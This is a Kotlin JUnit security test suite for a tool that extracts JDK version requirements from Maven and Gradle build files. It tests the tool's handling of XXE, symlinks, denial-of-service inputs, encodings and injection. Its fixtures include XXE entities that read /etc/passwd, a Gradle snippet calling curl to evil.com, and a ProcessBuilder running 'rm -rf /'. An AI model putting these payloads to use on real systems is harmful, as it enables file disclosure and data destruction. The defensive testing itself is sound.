package com.github.albertocavalcante.gvy.build.jdk

import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNotNull
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.nio.charset.Charset
import java.nio.file.Files
import java.nio.file.Path
import kotlin.system.measureTimeMillis
import kotlin.test.assertNotEquals

/**
 * Security-focused tests for JDK extraction code.
 * Tests XXE prevention, symlink handling, large file DoS, and encoding attacks.
 */
class JdkExtractionSecurityTest {

    @TempDir
    lateinit var tempDir: Path

    private val mavenExtractor = MavenJdkRequirementExtractor()
    private val gradleExtractor = GradleJdkRequirementExtractor()
    private val validator = ProjectJdkValidator()

    // XXE (XML External Entity) PREVENTION TESTS

    @Test
    fun `should prevent XXE attack with external entity in pom xml`() {
        val pomFile = tempDir.resolve("pom.xml")
        Files.writeString(
            pomFile,
            """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE pom [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <project xmlns="http://maven.apache.org/POM/4.0.0"
                     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                     xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
                <modelVersion>4.0.0</modelVersion>
                <groupId>test</groupId>
                <artifactId>test</artifactId>
                <version>1.0</version>

                <properties>
                    <maven.compiler.source>&xxe;</maven.compiler.source>
                </properties>
            </project>
            """.trimIndent(),
        )

        val result = mavenExtractor.extract(tempDir)

        // Should either fail to parse or not resolve the entity
        // Must NOT contain /etc/passwd content
        if (result is JdkRequirementResult.Found) {
            val source = result.requirement.sourceVersion
            // If it parsed, the source should be null (entity not resolved) or a valid number
            assertTrue(source == null || source > 0)
            assertNotEquals("root:", source?.toString()?.take(5))
        } else {
            // ParseError is acceptable - XXE was prevented
            assertTrue(result is JdkRequirementResult.ParseError || result is JdkRequirementResult.NotConfigured)
        }
    }

    @Test
    fun `should prevent XXE attack with parameter entity in pom xml`() {
        val pomFile = tempDir.resolve("pom.xml")
        Files.writeString(
            pomFile,
            """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE pom [
              <!ENTITY % xxe SYSTEM "file:///etc/passwd">
              %xxe;
            ]>
            <project xmlns="http://maven.apache.org/POM/4.0.0">
                <modelVersion>4.0.0</modelVersion>
                <groupId>test</groupId>
                <artifactId>test</artifactId>
                <version>1.0</version>
            </project>
            """.trimIndent(),
        )

        val result = mavenExtractor.extract(tempDir)

        // Should reject DOCTYPE declaration
        assertTrue(
            result is JdkRequirementResult.ParseError ||
                result is JdkRequirementResult.NotConfigured,
        )
    }

    @Test
    fun `should prevent XXE attack in toolchains xml`() {
        // First create a pom.xml that references toolchains
        val pomFile = tempDir.resolve("pom.xml")
        Files.writeString(
            pomFile,
            """
            <?xml version="1.0" encoding="UTF-8"?>
            <project xmlns="http://maven.apache.org/POM/4.0.0">
                <modelVersion>4.0.0</modelVersion>
                <groupId>test</groupId>
                <artifactId>test</artifactId>
                <version>1.0</version>
                <build>
                    <plugins>
                        <plugin>
                            <artifactId>maven-toolchains-plugin</artifactId>
                        </plugin>
                    </plugins>
                </build>
            </project>
            """.trimIndent(),
        )

        // Create malicious toolchains.xml
        val mvnDir = tempDir.resolve(".mvn")
        Files.createDirectory(mvnDir)
        val toolchainsFile = mvnDir.resolve("toolchains.xml")
        Files.writeString(
            toolchainsFile,
            """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE toolchains [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <toolchains>
                <toolchain>
                    <type>jdk</type>
                    <provides>
                        <version>&xxe;</version>
                    </provides>
                </toolchain>
            </toolchains>
            """.trimIndent(),
        )

        val result = mavenExtractor.extract(tempDir)

        // Should either fail to parse toolchains or not resolve entity
        // Must NOT leak /etc/passwd content
        if (result is JdkRequirementResult.Found) {
            val toolchain = result.requirement.toolchainVersion
            assertTrue(toolchain == null || toolchain > 0)
        }
        // ParseError or NotConfigured are acceptable outcomes
        assertTrue(
            result is JdkRequirementResult.ParseError ||
                result is JdkRequirementResult.NotConfigured ||
                result is JdkRequirementResult.Found,
        )
    }

    // SYMLINK HANDLING TESTS

    @Test
    fun `should not leak sensitive data through symlinked pom xml`() {
        // Create a symlink to /etc/passwd (if on Unix-like system)
        val targetFile = Path.of("/etc/passwd")
        if (Files.exists(targetFile)) {
            val symlinkPath = tempDir.resolve("pom.xml")
            try {
                Files.createSymbolicLink(symlinkPath, targetFile)

                val result = mavenExtractor.extract(tempDir)

                // Should fail to parse (not valid XML) or return error
                // Must NOT return passwd file content as version number
                assertTrue(
                    result is JdkRequirementResult.ParseError ||
                        result is JdkRequirementResult.NotConfigured,
                )
            } catch (e: UnsupportedOperationException) {
                // Symlinks not supported on this OS - skip test
            }
        }
    }

    @Test
    fun `should not crash on circular symlinks`() {
        val link1 = tempDir.resolve("pom.xml")
        val link2 = tempDir.resolve("link2.xml")

        try {
            Files.createSymbolicLink(link1, link2)
            Files.createSymbolicLink(link2, link1)

            // Should not hang or crash
            val result = mavenExtractor.extract(tempDir)

            assertTrue(
                result is JdkRequirementResult.ParseError ||
                    result is JdkRequirementResult.NotConfigured,
            )
        } catch (e: UnsupportedOperationException) {
            // Symlinks not supported - skip
        } catch (e: Throwable) {
            // Any exception other than StackOverflowError is acceptable
            // StackOverflowError would indicate infinite loop/recursion
            if (e is StackOverflowError) {
                throw AssertionError("Circular symlinks caused infinite recursion", e)
            }
        }
    }

    @Test
    fun `should handle symlinked java-version file safely`() {
        val targetFile = Path.of("/etc/hostname")
        if (Files.exists(targetFile)) {
            val symlinkPath = tempDir.resolve(".java-version")
            try {
                Files.createSymbolicLink(symlinkPath, targetFile)

                val requirement = validator.extractRequirement(tempDir)

                // Should fail to parse hostname as version number
                assertTrue(requirement == null || requirement.targetVersion == null)
            } catch (e: UnsupportedOperationException) {
                // Symlinks not supported - skip
            }
        }
    }

    // LARGE FILE DENIAL OF SERVICE TESTS

    @Test
    fun `should handle 10MB build gradle without OOM`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Create a 10MB file with valid Gradle content at the end
        val largeContent = buildString {
            // Add 10MB of comments
            repeat(100_000) {
                append("// This is a comment line to make the file large\n")
            }
            append("\nsourceCompatibility = 17\n")
        }

        Files.writeString(buildFile, largeContent)

        // Should complete without OOM
        val result = gradleExtractor.extract(tempDir)

        // Should successfully parse despite large file
        assertTrue(result is JdkRequirementResult.Found || result is JdkRequirementResult.NotConfigured)
    }

    @Test
    fun `should not degrade exponentially with large build gradle`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Create files of increasing size and measure parse time
        val smallSize = 10_000
        val largeSize = 100_000

        // Small file
        val smallContent = buildString {
            repeat(smallSize) {
                append("// comment\n")
            }
            append("sourceCompatibility = 17\n")
        }
        Files.writeString(buildFile, smallContent)
        val smallTime = measureTimeMillis {
            gradleExtractor.extract(tempDir)
        }

        // Large file (10x size)
        val largeContent = buildString {
            repeat(largeSize) {
                append("// comment\n")
            }
            append("sourceCompatibility = 17\n")
        }
        Files.writeString(buildFile, largeContent)
        val largeTime = measureTimeMillis {
            gradleExtractor.extract(tempDir)
        }

        // Parse time should scale linearly, not exponentially
        // 10x size should take less than 100x time (allowing 100x for noise)
        assertTrue(largeTime < smallTime * 100, "Parse time degraded exponentially: ${smallTime}ms -> ${largeTime}ms")
    }

    @Test
    fun `should handle extremely long single line in build gradle`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Create a file with one extremely long line (1MB)
        val longLine = "// " + "a".repeat(1_000_000) + "\nsourceCompatibility = 17\n"
        Files.writeString(buildFile, longLine)

        // Should not crash or hang
        val result = gradleExtractor.extract(tempDir)

        assertTrue(result is JdkRequirementResult.Found || result is JdkRequirementResult.NotConfigured)
    }

    @Test
    fun `should handle deeply nested regex backtracking in gradle file`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Create content that could cause catastrophic backtracking in poorly written regex
        val nestedContent = buildString {
            append("sourceCompatibility = ")
            repeat(10000) {
                append("JavaVersion.")
            }
            append("\n")
        }
        Files.writeString(buildFile, nestedContent)

        // Should complete in reasonable time (< 5 seconds)
        val time = measureTimeMillis {
            gradleExtractor.extract(tempDir)
        }

        assertTrue(time < 5000, "Regex took ${time}ms - possible catastrophic backtracking")
    }

    // ENCODING ATTACK TESTS

    @Test
    fun `should handle UTF-8 with BOM in build gradle`() {
        val buildFile = tempDir.resolve("build.gradle")

        // UTF-8 BOM: EF BB BF
        val bom = byteArrayOf(0xEF.toByte(), 0xBB.toByte(), 0xBF.toByte())
        val content = "sourceCompatibility = 17\n"
        val bytesWithBom = bom + content.toByteArray(Charsets.UTF_8)

        Files.write(buildFile, bytesWithBom)

        val result = gradleExtractor.extract(tempDir)

        assertTrue(result is JdkRequirementResult.Found)
        val found = result as JdkRequirementResult.Found
        assertTrue(found.requirement.sourceVersion == 17)
    }

    @Test
    fun `should handle ISO-8859-1 encoded file`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Write file in ISO-8859-1 encoding
        val content = "sourceCompatibility = 17\n"
        Files.write(buildFile, content.toByteArray(Charset.forName("ISO-8859-1")))

        val result = gradleExtractor.extract(tempDir)

        // Should parse correctly or fail gracefully
        assertTrue(result is JdkRequirementResult.Found || result is JdkRequirementResult.NotConfigured)
    }

    @Test
    fun `should handle UTF-16 encoded file`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Write file in UTF-16 encoding
        val content = "sourceCompatibility = 17\n"
        Files.write(buildFile, content.toByteArray(Charsets.UTF_16))

        val result = gradleExtractor.extract(tempDir)

        // UTF-16 will have BOM and different byte structure
        // Should either parse or return NotConfigured, not crash
        assertTrue(
            result is JdkRequirementResult.Found ||
                result is JdkRequirementResult.NotConfigured ||
                result is JdkRequirementResult.ParseError,
        )
    }

    @Test
    fun `should handle mixed encodings in pom xml`() {
        val pomFile = tempDir.resolve("pom.xml")

        // Create XML with UTF-8 declaration but ISO-8859-1 content
        val xmlContent = """
            <?xml version="1.0" encoding="UTF-8"?>
            <project xmlns="http://maven.apache.org/POM/4.0.0">
                <modelVersion>4.0.0</modelVersion>
                <groupId>test</groupId>
                <artifactId>test</artifactId>
                <version>1.0</version>

                <properties>
                    <maven.compiler.source>17</maven.compiler.source>
                </properties>
            </project>
        """.trimIndent()

        Files.write(pomFile, xmlContent.toByteArray(Charset.forName("ISO-8859-1")))

        val result = mavenExtractor.extract(tempDir)

        // Should handle encoding mismatch gracefully
        assertTrue(
            result is JdkRequirementResult.Found ||
                result is JdkRequirementResult.ParseError ||
                result is JdkRequirementResult.NotConfigured,
        )
    }

    @Test
    fun `should handle null bytes in build gradle`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Content with embedded null bytes
        val content = "sourceCompatibility\u0000 = 17\n"
        Files.writeString(buildFile, content)

        val result = gradleExtractor.extract(tempDir)

        // Should not crash - may or may not parse successfully
        assertNotNull(result)
    }

    // PATH TRAVERSAL TESTS

    @Test
    fun `should not follow parent directory references in pom xml`() {
        val pomFile = tempDir.resolve("pom.xml")
        Files.writeString(
            pomFile,
            """
            <?xml version="1.0" encoding="UTF-8"?>
            <project xmlns="http://maven.apache.org/POM/4.0.0">
                <modelVersion>4.0.0</modelVersion>
                <groupId>test</groupId>
                <artifactId>test</artifactId>
                <version>1.0</version>

                <parent>
                    <groupId>../../../etc/passwd</groupId>
                    <artifactId>evil</artifactId>
                    <version>1.0</version>
                </parent>

                <properties>
                    <maven.compiler.source>17</maven.compiler.source>
                </properties>
            </project>
            """.trimIndent(),
        )

        val result = mavenExtractor.extract(tempDir)

        // Should parse the properties regardless of parent reference
        // Maven model builder handles parent resolution safely
        assertTrue(
            result is JdkRequirementResult.Found ||
                result is JdkRequirementResult.ParseError ||
                result is JdkRequirementResult.NotConfigured,
        )
    }

    // INJECTION TESTS

    @Test
    fun `should handle script injection attempts in build gradle`() {
        val buildFile = tempDir.resolve("build.gradle")
        Files.writeString(
            buildFile,
            """
            // Attempted script injection
            Runtime.getRuntime().exec("curl http://evil.com")

            sourceCompatibility = 17

            // Another injection
            new ProcessBuilder("rm", "-rf", "/").start()
            """.trimIndent(),
        )

        val result = gradleExtractor.extract(tempDir)

        // Regex-based parsing should NOT execute the script
        // Should safely extract version
        assertTrue(result is JdkRequirementResult.Found)
        val found = result as JdkRequirementResult.Found
        assertTrue(found.requirement.sourceVersion == 17)
    }

    @Test
    fun `should handle regex injection in version number`() {
        val buildFile = tempDir.resolve("build.gradle")
        Files.writeString(
            buildFile,
            """
            sourceCompatibility = "(.*)*x"
            """.trimIndent(),
        )

        val result = gradleExtractor.extract(tempDir)

        // Should not parse invalid version
        assertTrue(result is JdkRequirementResult.NotConfigured)
    }

    @Test
    fun `should handle negative version numbers`() {
        val buildFile = tempDir.resolve("build.gradle")
        Files.writeString(
            buildFile,
            """
            sourceCompatibility = -17
            """.trimIndent(),
        )

        val result = gradleExtractor.extract(tempDir)

        // Should reject negative versions
        assertTrue(result is JdkRequirementResult.NotConfigured)
    }

    @Test
    fun `should handle zero version number`() {
        val buildFile = tempDir.resolve("build.gradle")
        Files.writeString(
            buildFile,
            """
            sourceCompatibility = 0
            """.trimIndent(),
        )

        val result = gradleExtractor.extract(tempDir)

        if (result is JdkRequirementResult.Found) {
            // If it parses 0, should handle it safely in validation
            val validation = validator.validate(tempDir, runningJdk = 17)
            assertNotNull(validation)
        }
    }

    // RESOURCE EXHAUSTION TESTS

    @Test
    fun `should handle pom xml with deeply nested elements`() {
        val pomFile = tempDir.resolve("pom.xml")

        // Create deeply nested XML (100 levels)
        val deepXml = buildString {
            append("""<?xml version="1.0" encoding="UTF-8"?>""")
            append("\n")
            append("""<project xmlns="http://maven.apache.org/POM/4.0.0">""")
            append("\n")
            append("  <modelVersion>4.0.0</modelVersion>\n")
            append("  <groupId>test</groupId>\n")
            append("  <artifactId>test</artifactId>\n")
            append("  <version>1.0</version>\n")
            append("  <properties>\n")

            // Deep nesting
            repeat(100) {
                append("    <nested$it>\n")
            }
            append("      <maven.compiler.source>17</maven.compiler.source>\n")
            repeat(100) {
                append("    </nested${99 - it}>\n")
            }

            append("  </properties>\n")
            append("</project>")
        }

        Files.writeString(pomFile, deepXml)

        val result = mavenExtractor.extract(tempDir)

        // Should handle deep nesting without stack overflow
        assertNotNull(result)
        assertFalse(result is Error)
    }

    @Test
    fun `should handle gradle file with thousands of patterns`() {
        val buildFile = tempDir.resolve("build.gradle")

        // Create file with many false positives for regex
        val manyPatterns = buildString {
            repeat(10000) {
                append("// sourceCompatibility = fake\n")
            }
            append("sourceCompatibility = 17\n")
        }

        Files.writeString(buildFile, manyPatterns)

        // Should complete in reasonable time
        val time = measureTimeMillis {
            val result = gradleExtractor.extract(tempDir)
            assertTrue(result is JdkRequirementResult.Found)
        }

        assertTrue(time < 5000, "Parsing took ${time}ms - possible performance issue")
    }
}
